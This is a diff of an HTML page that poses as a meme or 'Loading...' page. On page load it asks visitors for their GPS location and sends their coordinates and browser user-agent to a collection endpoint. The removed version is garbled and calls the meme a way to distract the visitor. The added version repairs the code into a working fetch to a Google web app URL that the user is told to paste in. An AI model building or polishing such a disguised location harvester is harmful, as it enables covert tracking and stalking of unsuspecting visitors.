@@ -1,66 +1,33 @@
 <!DOCTYPE html>
-
-<html>
-
+<html lang="en">
 <head>
-  <iframe src="https://giphy.com/embed/yVZrYMkdgY5Pi" width="480" height="360" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/cute-giggle-yVZrYMkdgY5Pi">via GIPHY</a></p>
-
-
-
-  
-// Triggers GPS permission request on page load function getLocation() { if
-
-(navigator.geolocation) {
-
-navigator.geolocation .getCurrentPosition(showPosition); }
-
-}
-
-// Extracts coordinates and
-
-browser user-agent, sending a GET
-
-request to store.php
-<script>
-function
-
-showPosition(position) {
-
-var
-
-xhttp = new
-
-xhttp.open("GET",
-
-XMLHttpRequest();
-
-"store.php?lat=" + position.coords.latitude +
-
-"&long=" + position.coords.longitude
-
-"&uagent=" + navigator.userAgent, true);
-xhttp.send();
-}
-
-</script>
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
 </head>
-
 <body onload="getLocation()">
 
-<!-- Embedded iframe displaying
+  <iframe src="https://giphy.com" width="480" height="360" frameBorder="0"></iframe>
 
-the meme to distract the visitor
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      }
+    }
 
-src="[MEME_EMBED_URL_HERE]"
+    function showPosition(position) {
+      // PASTE YOUR GOOGLE WEB APP URL BETWEEN THE QUOTES BELOW
+      var scriptURL = "YOUR_GOOGLE_WEB_APP_URL_HERE";
+      
+      var url = scriptURL + 
+                "?lat=" + position.coords.latitude + 
+                "&long=" + position.coords.longitude + 
+                "&uagent=" + encodeURIComponent(navigator.userAgent);
 
-width="480" height="480"
-
-frameborder="0" allowfullscreen></
-
-iframe>
+      fetch(url, { mode: "no-cors" });
+    }
+  </script>
 
 </body>
-
 </html>
-
